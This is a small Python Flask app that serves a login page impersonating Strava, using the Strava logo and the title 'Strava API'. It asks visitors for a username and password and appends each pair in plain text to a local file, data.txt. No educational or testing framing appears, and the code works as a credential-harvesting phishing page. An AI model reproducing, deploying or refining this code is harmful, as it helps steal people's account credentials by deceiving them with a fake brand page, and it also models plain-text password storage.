from flask import Flask, request

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # Store the username and password in a file
        with open('data.txt', 'a') as f:
            f.write(f'{username},{password}\n')
        return '<h1>Data stored successfully!</h1>'
    return '''
        <html>
            <head>
                <title>Strava API</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background-color: #f2f2f2;
                    }
                    form {
                        max-width: 400px;
                        margin: 0 auto;
                        background-color: #fff;
                        padding: 20px;
                        border-radius: 10px;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    }
                    label {
                        display: block;
                        margin-bottom: 10px;
                        font-weight: bold;
                    }
                    input[type="text"], input[type="password"] {
                        width: 100%;
                        padding: 10px;
                        border-radius: 5px;
                        border: none;
                        box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
                        margin-bottom: 20px;
                    }
                    input[type="submit"] {
                        background-color: #008CBA;
                        color: #fff;
                        padding: 10px 20px;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        font-weight: bold;
                        transition: all 0.2s ease-in-out;
                    }
                    input[type="submit"]:hover {
                        background-color: #006080;
                    }
                    .logo {
                        display: inline-block;
                        margin-right: 10px;
                    }
                </style>
            </head>
            <body>
                <form method="post">
                    <img src="https://cdn.road.cc/sites/default/files/styles/main_width/public/strava-logo-2016.png" alt="Strava Logo" width="200">
                    <img src="https://www.mensjournal.com/.image/c_limit%2Ccs_srgb%2Cq_auto:good%2Cw_700/MTk2MTM2OTM4NDYyMDYxNzEz/man-running-on-road.webp" alt="Strava Logo" width="200">
                    <h1>Strava API</h1>
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password">
                    <input type="submit" value="Submit">
                </form>
            </body>
        </html>
    '''

if __name__ == '__main__':
    app.run()